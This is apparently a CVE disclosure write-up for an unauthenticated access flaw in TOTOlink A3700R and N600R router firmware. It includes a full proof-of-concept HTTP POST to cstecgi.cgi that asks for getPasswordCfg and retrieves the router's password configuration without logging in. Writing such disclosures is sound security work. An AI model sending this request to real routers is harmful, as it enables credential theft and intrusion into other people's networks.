

# CVE-2023-43141

# TOTOlink A3700R(V9.1.2u.6134_B20201202),N600R(V4.3.0cu.7647_B20210106) have unauthorized access vulnerabilities.

# Description

---

The attacker can gain unauthorized access to the interface, read configuration file information, and obtain access to the backend as well as other system services with open permissions.

# Firmware information

---

- Manufacturer's address: http://totolink.net/
- Firmware download address:(A3700R): https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/207/ids/36.html
- Firmware download address:(N600R): https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/160/ids/36.html

# Affected version

---

Version: A3700R(V9.1.2u.6134_B20201202)

![image-20230909144211545](https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/cve/image-20230909144211545.png)

Version:N600R(V4.3.0cu.7647_B20210106)

![image-20230909143902919](https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/cve/image-20230909143902919.png)

# Vulnerability details

---

POC

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.50.129
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 25
Origin: http://192.168.50.129
Connection: close
Referer: http://192.168.50.129/login.html

{"topicurl":"getPasswordCfg"}
```



![image-20230909142956661](https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/cve/image-20230909142956661.png)
